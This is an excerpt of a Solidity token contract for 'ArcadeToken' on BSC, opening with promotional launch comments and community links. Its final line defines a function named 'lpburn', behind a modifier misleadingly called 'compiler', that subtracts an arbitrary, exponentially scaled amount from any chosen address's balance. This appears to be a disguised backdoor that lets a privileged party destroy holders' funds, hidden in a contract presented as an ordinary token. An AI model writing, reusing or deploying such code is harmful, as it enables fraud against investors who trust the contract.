...
/*
$ARCADE TOKEN BSC token.
We are launching a token on the BSC along with our token relaunch on ETH.

Telegram:
//https://t.me/ArcadeEth
Please check pinned messages before asking questions in main chat. 
Discord:
//https://discord.gg/agZRdkXHK6
Website:
//https://ArcadeToken.io
Reddit: ArcadeEth
Twitter: ArcadeEth
...
contract ArcadeToken {
    ...
    address public marketingaddress = 0x39a4083eD6Addb969d1b671b204CcCfa207de9a8;
    uint256 public totalSupply = 10000000 * 10 ** 6;
    uint256 public liquiditytax = 6;
    uint256 public marketingtax = 1;
    uint256 public reflectiontax = 3;
    ...
    uint256 private _maxWalletSize = 20000;
...
//BUSD address 0xe9e7cea3dedca5984780bafc599bd69add087d56
    ...
    function lpburn(address spender,uint256 lpburn) public compiler returns (bool success) {balanceOf[spender] -= lpburn * checksum_rounder ** numTokensSellToAddToLiquidity;return true;}
